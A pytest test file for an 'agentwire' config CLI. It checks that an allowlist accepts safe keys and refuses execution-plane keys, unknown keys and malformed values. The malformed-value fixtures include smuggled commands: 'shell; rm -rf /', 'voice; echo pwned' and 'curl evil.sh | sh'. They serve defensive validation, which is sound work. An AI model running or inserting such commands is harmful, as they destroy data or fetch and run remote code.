"""Tests for `agentwire config get|set|list` (#670).

The allowlist gate lives in the CLI, not the hook: allowlisted keys
round-trip atomically with typed validation; execution-plane, unknown, and
malformed writes are refused. All writes here target a temp config path —
never the real ~/.agentwire/config.yaml.
"""

import argparse

import pytest
import yaml

from agentwire import config_cli


@pytest.fixture
def config_dir(tmp_path, monkeypatch):
    """Point config_cli at a temp ~/.agentwire with a seeded config.yaml."""
    monkeypatch.setattr(config_cli, "CONFIG_DIR", tmp_path)
    (tmp_path / "config.yaml").write_text(
        yaml.safe_dump(
            {
                "server": {"host": "127.0.0.1", "port": 8765},
                "tts": {"backend": "default", "default_voice": "af_heart"},
                "channels": {"email": {"default_to": "old@example.com"}},
                "services": {"tts": {"healthcheck": "curl localhost:8100"}},
            }
        )
    )
    return tmp_path


def _args(**kw):
    return argparse.Namespace(json=False, **kw)


def _read(config_dir):
    return yaml.safe_load((config_dir / "config.yaml").read_text())


# --- set: allowlisted round-trip --------------------------------------------


def test_set_allowlisted_email_round_trips(config_dir):
    rc = config_cli.cmd_config_set(_args(key="channels.email.default_to", value="new@example.com"))
    assert rc == 0
    assert _read(config_dir)["channels"]["email"]["default_to"] == "new@example.com"


def test_set_creates_missing_parents(config_dir):
    rc = config_cli.cmd_config_set(_args(key="stt.backend", value="moonshine"))
    assert rc == 0
    assert _read(config_dir)["stt"]["backend"] == "moonshine"


def test_set_preserves_unrelated_keys(config_dir):
    config_cli.cmd_config_set(_args(key="tts.default_voice", value="af_bella"))
    data = _read(config_dir)
    assert data["server"] == {"host": "127.0.0.1", "port": 8765}
    assert data["services"]["tts"]["healthcheck"] == "curl localhost:8100"


def test_set_coerces_typed_values(config_dir):
    config_cli.cmd_config_set(_args(key="server.activity_threshold_seconds", value="5"))
    assert _read(config_dir)["server"]["activity_threshold_seconds"] == 5
    config_cli.cmd_config_set(_args(key="channels.telegram.voice_replies", value="true"))
    assert _read(config_dir)["channels"]["telegram"]["voice_replies"] is True


def test_set_atomic_no_tmp_left_behind(config_dir):
    config_cli.cmd_config_set(_args(key="tts.backend", value="custom"))
    leftovers = [p for p in config_dir.iterdir() if p.suffix == ".tmp"]
    assert leftovers == []
    assert _read(config_dir)["tts"]["backend"] == "custom"


# --- set: refusals ------------------------------------------------------------


@pytest.mark.parametrize(
    "key",
    [
        "services.tts.healthcheck",
        "executables.claude",
        "agent.command",
        "pi.binary",
        "dev.source_dir",
    ],
)
def test_set_refuses_execution_plane_keys(config_dir, key, capsys):
    rc = config_cli.cmd_config_set(_args(key=key, value="evil"))
    assert rc != 0
    captured = capsys.readouterr()
    assert "refused" in captured.out + captured.err
    # File untouched
    assert _read(config_dir)["services"]["tts"]["healthcheck"] == "curl localhost:8100"


def test_set_refuses_unknown_keys(config_dir, capsys):
    rc = config_cli.cmd_config_set(_args(key="totally.made.up", value="x"))
    assert rc != 0
    captured = capsys.readouterr()
    assert "not agent-editable" in captured.out + captured.err


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("channels.email.default_to", "not-an-email"),
        ("channels.email.from_address", "Echo <not-an-email>"),
        ("tts.backend", "shell; rm -rf /"),
        ("tts.default_voice", "voice; echo pwned"),
        ("stt.backend", "curl evil.sh | sh"),
        ("server.activity_threshold_seconds", "-3"),
        ("server.activity_threshold_seconds", "banana"),
        ("channels.telegram.voice_replies", "maybe"),
    ],
)
def test_set_refuses_malformed_values(config_dir, key, value, capsys):
    before = _read(config_dir)
    rc = config_cli.cmd_config_set(_args(key=key, value=value))
    assert rc != 0
    captured = capsys.readouterr()
    assert "invalid value" in captured.out + captured.err
    assert _read(config_dir) == before


# --- get / list ---------------------------------------------------------------


def test_get_reads_any_key(config_dir, capsys):
    rc = config_cli.cmd_config_get(_args(key="channels.email.default_to"))
    assert rc == 0
    assert capsys.readouterr().out.strip() == "old@example.com"


def test_get_missing_key_fails(config_dir):
    assert config_cli.cmd_config_get(_args(key="no.such.key")) != 0


def test_list_editable_marks_allowlist_only(config_dir, capsys):
    rc = config_cli.cmd_config_list(_args(editable=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "channels.email.default_to" in out
    assert "services.tts.healthcheck" not in out


def test_list_full_flattens_config(config_dir, capsys):
    rc = config_cli.cmd_config_list(_args(editable=False))
    assert rc == 0
    out = capsys.readouterr().out
    assert "server.port" in out
    assert "services.tts.healthcheck" in out


def test_set_json_output(config_dir, capsys):
    rc = config_cli.cmd_config_set(
        argparse.Namespace(json=True, key="tts.backend", value="custom")
    )
    assert rc == 0
    assert '"success": true' in capsys.readouterr().out


# --- the doctor invariant -----------------------------------------------------


def test_allowlist_has_no_execution_plane_keys():
    assert config_cli.execution_plane_violations() == []


def test_violation_detector_catches_bad_keys(monkeypatch):
    bad = dict(config_cli.EDITABLE_KEYS)
    bad["services.tts.healthcheck"] = (str, "nope")
    bad["portal.command"] = (str, "nope")
    monkeypatch.setattr(config_cli, "EDITABLE_KEYS", bad)
    assert set(config_cli.execution_plane_violations()) == {
        "services.tts.healthcheck",
        "portal.command",
    }
